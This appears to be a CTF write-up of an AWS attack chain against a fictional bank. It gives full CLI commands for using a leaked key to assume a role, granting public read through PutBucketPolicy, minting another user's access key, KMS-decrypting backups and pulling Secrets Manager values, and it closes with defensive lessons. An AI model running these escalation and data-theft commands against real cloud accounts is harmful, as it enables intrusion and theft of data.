---
title: "SYBank — how a key in a test file cost them the whole database"
date: 2026-09-13
draft: false
description: "A PwnSec CTF chain: a leaked AWS key in a test file leads to role assumption, S3 bucket-policy abuse, a recovered Vim swap file, and envelope-encrypted RDS backups decrypted straight through KMS."
tags: ["ctf", "cloud", "aws"]
---

I don't usually go this deep on the cloud challenges. Most are either "we hid a flag in an S3 bucket, go find it" or a rabbit hole that needs three IAM PhDs. This one was different: a proper chain, the kind of thing that actually happens at work. Every step was a real mistake I've either caught in a review or, honestly, almost made myself.

So here's how it went. Endpoint for the whole thing was a hosted AWS-compatible box:

```bash
# export AWS_ENDPOINT_URL="https://localhost:8888"   # only if you're running LocalStack yourself
export AWS_ENDPOINT_URL="https://28abecb4e9659ba9.chal.ctf.ae"
```

Set that once and every `aws` command talks to the challenge instead of a real account. Forget it and your commands hit actual AWS and get denied. Ask me how I know.

## Part 1 — finding the way in

No creds to start with, just a company name and a person. Classic. An OSINT warm-up before you get to touch anything cloudy.

Found the guy's LinkedIn first and read the bio properly, since people always slip something in there: a personal site, a handle, whatever. This one dropped a username, `blvkrose`. That's a thread to pull.

Ran sherlock on it to see where else it lived:

```bash
sherlock blvkrose
```

GitHub came back, which is what I was hoping for. I almost went straight for the app code first, which wasted ten minutes. The gold was in the tests. It nearly always is. Somebody needed their integration test to actually talk to S3, hardcoded a real key "temporarily," and git remembered it forever:

```python
# tucked into one of the tests/test_*.py files
AWS_ACCESS_KEY_ID     = "AKIA................"
AWS_SECRET_ACCESS_KEY = "................................"
```

I've done a version of this myself. Not pushed it, thank god, but I've had a real key sitting in a local test file for way too long. It's an easy trap. Tests are code, the repo is public, and a string that looks like a credential is a credential to anyone reading.

That's our foothold.

## Part 2 — okay, who am I?

First move with any AWS key, always:

```bash
aws configure                 # pasted the leaked AKIA key + secret
aws sts get-caller-identity
```

`get-caller-identity` is my `whoami` for AWS, and it can't lie: if the key's valid, it hands you the account ID and exactly which principal you are. Turned out to be some low-level dev identity, not exciting on its own.

The interesting part with a boring identity is always what it can turn into. So I listed roles:

```bash
aws iam list-roles
```

And there it is: `assumeRole-dba`. Roles are supposed to be assumable only by trusted principals, but a loose trust policy just lets you walk in.

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/assumeRole-dba \
  --role-session-name dba
```

That spits back temporary creds: access key, secret, session token. Lateral movement, cloud-style — same account, bigger badge. I stashed it as a profile so I could hop between identities without losing my mind:

```bash
aws configure --profile dba          # pasted the assume-role output, session token included
aws sts get-caller-identity --profile dba
aws --profile dba s3 ls
```

Two buckets worth caring about:

```bash
aws --profile dba s3 ls s3://sybank-dev-s3rdsbackupfiles   # encrypted RDS backups
aws --profile dba s3 ls s3://sybank-dev-s3filesharing      # has a .automation.sh.swp
```

That `.automation.sh.swp` made me grin. It's a Vim swap file. Every time you open a file in Vim it drops a hidden `.<name>.swp` next to it holding the buffer, so a leftover `.swp` is basically a snapshot of whatever someone was editing. Here, an `automation.sh`. It usually still has the plaintext the real script was hiding.

Problem: I could list it as dba but couldn't `GetObject` it. Denied. Sat there annoyed for a second, then remembered dba could touch the bucket policy.

If you can't read the object but you can rewrite the bucket's resource policy, you just grant yourself the read. That's it. dba had `s3:PutBucketPolicy`, so:

```bash
aws --profile dba s3api put-bucket-policy \
  --bucket sybank-dev-s3filesharing \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::sybank-dev-s3filesharing/*"
    }]
  }'
```

This bites people in the real world constantly. Access in S3 is identity policy OR resource policy, either one is enough. So `s3:PutBucketPolicy` isn't "manage a setting." It's effectively "read and write everything in this bucket," because whoever holds it can just author themselves the permission. I've flagged this exact thing in a review before and watched someone go "wait, that's it?" Yeah. That's it.

Grabbed the file:

```bash
aws --profile dba s3 cp s3://sybank-dev-s3filesharing/.automation.sh.swp .
```

Recovered the text. `vim -r .automation.sh.swp` works, but `strings` on it was enough to read what mattered. The script referenced a second IAM user, `dba-sec`, and dba was allowed to manage it. Which means I didn't need that user's password or existing keys. I just minted a fresh one:

```bash
aws iam create-access-key --user-name dba-sec --profile dba
```

`iam:CreateAccessKey` on another user is game over for that user. You can always print yourself a working key for them. Favorite persistence trick for a reason.

## Part 3 — becoming sec and grabbing the backups

New key, new profile:

```bash
aws configure --profile sec
aws sts get-caller-identity --profile sec
```

`sec` was more locked down than dba, and a plain `s3 ls` died on the spot:

```bash
aws --profile sec s3 ls                                       # AccessDenied
aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles      # this works though
```

Fine, that's least-privilege doing its job. sec only has rights on the backups bucket, and that's the bucket I wanted anyway.

The backups sit in timestamped folders. Listed one and looped over it to pull everything down:

```bash
for i in $(aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles/dumps/20260912_194858/ | awk '{print $4}'); do
  aws --profile sec s3 cp s3://sybank-dev-s3rdsbackupfiles/dumps/20260912_194858/$i . ;
done
```

Quick note to save you the headache I gave myself: list and copy from the same timestamp. I fat-fingered mine, listed `...194858/` but copied from `...123006/`, then sat there wondering why nothing downloaded. Nothing was broken. I was just pointing at two different folders. Keep them the same.

Each dump folder had three files:

- `sy_internal_<ts>.keyblob.b64`: the data key, itself encrypted by KMS, base64'd
- `sy_internal_<ts>.globals.sql.enc`: Postgres roles/users, OpenSSL-encrypted
- `sy_internal_<ts>.dump.enc`: the actual `pg_dump`, OpenSSL-encrypted

Textbook envelope encryption, the AWS backup pattern. The data gets encrypted with a random symmetric key, and that key gets wrapped by a KMS master key and dropped next to the data as the "key blob." So to read anything you first have to ask KMS to unwrap the key.

And here's the whole point of the challenge: sec can read the backups, and sec can also call `kms:Decrypt`. So the encryption buys them nothing. I just asked KMS nicely:

```bash
aws --profile sec kms decrypt \
  --ciphertext-blob file://sy_internal_20260911_161409.keyblob.b64
```

The `Plaintext` in the response was the data key: `+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U=`. That base64 string is literally the passphrase the dumps were encrypted with. So OpenSSL, matching how they were encrypted (AES-256-CBC, PBKDF2):

```bash
openssl enc -d -aes-256-cbc -pbkdf2 \
  -pass pass:+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U= \
  -in sy_internal_20260911_161409.globals.sql.enc -out globals

openssl enc -d -aes-256-cbc -pbkdf2 \
  -pass pass:+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U= \
  -in sy_internal_20260911_161409.dump.enc -out dump
```

The crypto here is completely fine, by the way. Nothing was broken. The mistake sits in the permissions around the key: the exact same identity that can pull the encrypted backup can also decrypt the key that protects it. Split those two and this step is dead. That's the line I'd write in the postmortem.

While I was in there, sec could also read Secrets Manager, so I checked it for DB creds:

```bash
aws --profile sec secretsmanager list-secrets --region us-east-1
aws --profile sec secretsmanager get-secret-value --secret-id dbsec/database --region us-east-1
```

Watch the syntax. The name goes in `--secret-id`, `--region` is a flag. I typo'd this two different ways before it worked. `dbsec/database` held the connection details, confirming what I was about to restore anyway.

## Part 4 — restore it and read the flag

The dump is a normal `pg_dump` custom-format archive, so the easiest path is spinning up a throwaway Postgres and restoring into it:

```bash
docker run -d \
  --name postgres \
  -e POSTGRES_PASSWORD=root \
  -p 5432:5432 \
  -v ./db:/tmp \
  postgres:latest
```

Two things I tripped on: don't drop the `\` before `postgres:latest` (skip it and the volume line eats the image name), and `-v ./db:/tmp` means my local `./db` shows up as `/tmp` in the container. So `globals` and `dump` went into `./db`, landing at `/tmp/globals` and `/tmp/dump` inside.

Then shell in and restore in order. Globals first, since they create the roles the dump expects to own things. Skip that step and `pg_restore` throws a wall of "role does not exist" warnings.

```bash
docker exec -it postgres bash

psql -U postgres -f /tmp/globals          # roles/users first
createdb -U postgres sy_internal          # make the target DB
pg_restore -U postgres -d sy_internal --clean --if-exists /tmp/dump
psql -U postgres -d sy_internal           # poke around
```

From there it's just SQL:

```sql
\dt
SELECT * FROM <the table that obviously holds it>;
```

Flag was sitting in one of the restored tables. `CTF{...}`.

## Looking back

What I like about this one: there's no single "hack." It's six small, boring, realistic mistakes stacked on top of each other.

1. A live key committed into a test file.
2. A role almost anyone could assume.
3. `s3:PutBucketPolicy` handed out like it's harmless. It is not.
4. An editor swap file left in shared storage, plus `iam:CreateAccessKey` on another user.
5. The backup reader also holding `kms:Decrypt`.
6. The reminder that a recoverable backup is just plaintext with extra steps.

Break any one link and the chain snaps. You don't defend against "the attack." You defend against each little link. Scan for secrets before you push. Scope your trust policies tightly. Treat `PutBucketPolicy` and `CreateAccessKey` as admin, because they are. Keep temp files out of buckets. And don't let the same role read the backup and unwrap its key.

Good challenge. Would've saved myself fifteen minutes reading the tests first and matching my folder timestamps, but that's CTFs for you.
